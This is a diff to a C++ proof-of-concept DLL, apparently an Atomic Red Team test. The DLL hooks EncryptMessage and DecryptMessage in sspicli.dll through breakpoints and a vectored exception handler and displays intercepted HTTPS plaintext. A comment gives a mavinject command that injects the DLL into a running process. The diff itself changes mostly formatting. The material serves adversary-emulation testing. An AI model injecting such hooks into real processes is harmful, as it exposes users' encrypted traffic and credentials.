@@ -11,13 +11,13 @@ FARPROC fpDecryptMessage; //Pointer To The Original Location
 BYTE bSavedByte2; //Saved Byte Overwritten by 0xCC -
 
 
-// Original Idea/Reference Blog Post Here:
-// https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108
-// PoC by Casey Smith @subTee
-// From PowerShell
-// mavinject.exe $pid /INJECTRUNNING C:\AtomicTests\AtomicSSLHookx64.dll
-// curl https://www.example.com
-// Should Hook and Display Request/Response from HTTPS
+				  // Original Idea/Reference Blog Post Here:
+				  // https://0x00sec.org/t/user-mode-rootkits-iat-and-inline-hooking/1108
+				  // PoC by Casey Smith @subTee
+				  // From PowerShell
+				  // mavinject.exe $pid /INJECTRUNNING C:\AtomicTests\AtomicSSLHookx64.dll
+				  // curl https://www.example.com
+				  // Should Hook and Display Request/Response from HTTPS
 
 
 
@@ -34,7 +34,7 @@ BOOL WriteMemory(FARPROC fpFunc, LPCBYTE b, SIZE_T size) {
 
 //TODO, Combine  HOOK Function To take 2 params. DLL and Function Name.
 VOID HookFunction(VOID) {
-	fpEncryptMessage = GetProcAddress(LoadLibrary(L"sspicli.dll"), "EncryptMessage");
+	fpEncryptMessage = GetProcAddress(LoadLibraryW(L"sspicli.dll"), "EncryptMessage");
 	if (fpEncryptMessage == NULL) {
 		return;
 	}
@@ -48,7 +48,7 @@ VOID HookFunction(VOID) {
 }
 
 VOID HookFunction2(VOID) {
-	fpDecryptMessage = GetProcAddress(LoadLibrary(L"sspicli.dll"), "DecryptMessage");
+	fpDecryptMessage = GetProcAddress(LoadLibraryW(L"sspicli.dll"), "DecryptMessage");
 	if (fpDecryptMessage == NULL) {
 		return;
 	}
@@ -68,9 +68,9 @@ SECURITY_STATUS MyEncryptMessage(
 	ULONG          MessageSeqNo
 )
 {
-	
+
 	char* buffer = (char*)((DWORD_PTR)(pMessage->pBuffers->pvBuffer) + 0x29); //Just Hardcode for PoC
-	
+
 	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);
 
 	if (WriteMemory(fpEncryptMessage, &bSavedByte, sizeof(BYTE)) == FALSE) {
@@ -89,14 +89,14 @@ SECURITY_STATUS MyDecryptMessage(
 	ULONG          fQOP
 )
 {
-	
+
 	if (WriteMemory(fpDecryptMessage, &bSavedByte2, sizeof(BYTE)) == FALSE) {
 		ExitThread(0);
 	}
 
-	SECURITY_STATUS SEC_EntryRet = DecryptMessage(phContext, pMessage, MessageSeqNo, &fQOP );
+	SECURITY_STATUS SEC_EntryRet = DecryptMessage(phContext, pMessage, MessageSeqNo, &fQOP);
 
-	char* buffer = (char*)(pMessage->pBuffers->pvBuffer); 
+	char* buffer = (char*)(pMessage->pBuffers->pvBuffer);
 
 	::MessageBoxA(NULL, buffer, "MITM Intercept", 0);
 
@@ -110,7 +110,7 @@ MyVectoredExceptionHandler1(
 	struct _EXCEPTION_POINTERS *ExceptionInfo
 )
 {
-		UNREFERENCED_PARAMETER(ExceptionInfo);
+	UNREFERENCED_PARAMETER(ExceptionInfo);
 #ifdef _WIN64
 	if (ExceptionInfo->ContextRecord->Rip == (DWORD_PTR)fpEncryptMessage)
 		ExceptionInfo->ContextRecord->Rip = (DWORD_PTR)MyEncryptMessage;
